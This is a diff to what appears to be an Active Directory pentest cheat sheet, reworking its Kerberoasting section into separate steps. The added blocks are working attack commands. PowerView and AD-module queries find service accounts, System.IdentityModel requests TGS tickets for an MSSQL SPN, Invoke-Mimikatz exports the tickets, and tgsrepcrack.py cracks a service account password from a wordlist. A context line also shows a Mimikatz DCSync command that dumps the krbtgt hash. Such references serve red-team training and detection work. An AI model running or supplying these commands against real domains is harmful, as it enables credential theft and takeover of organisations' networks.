@@ -251,9 +251,22 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  #Gets the hash 
 
 # Privilege Escalation - Kerberoast
 
+- **Enumeration with Powerview:**
 ```
-Get-NetUser SPN                                                                                                                 #Find user accounts used as Service accounts with PowerView
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName                                          #Find user accounts used as Service accounts with ActiveDirectory Module
-Add-Type -AssemblyNAme System.IdentityModel                                                                                     #Request a TGS - Phase 1
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.corp.corporaye.local"  #Request a TGS - Phase 2
+Get-NetUser SPN           #Find user accounts used as Service accounts with PowerView
+```
+- **Enumeration with AD Module:**
+```
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName      #Find user accounts used as Service accounts
+```
+- **Request a TGS:**
+```
+Add-Type -AssemblyNAme System.IdentityModel                                                                                    #Request a TGS - Phase 1
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.corp.corporate.local" #Request a TGS - Phase 2
+klist                                                                                                                          #Check if the TGS has been granted
+```
+- **Export and crack TGS:**
+- ```
+Invoke-Mimikatz -Command '"kerberos::list /export"'                                                                                        #Export all tickets
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.corp.corporate.local-CORP.CORPORATE.LOCAL.kirbi #Crack the Service account password
 ```
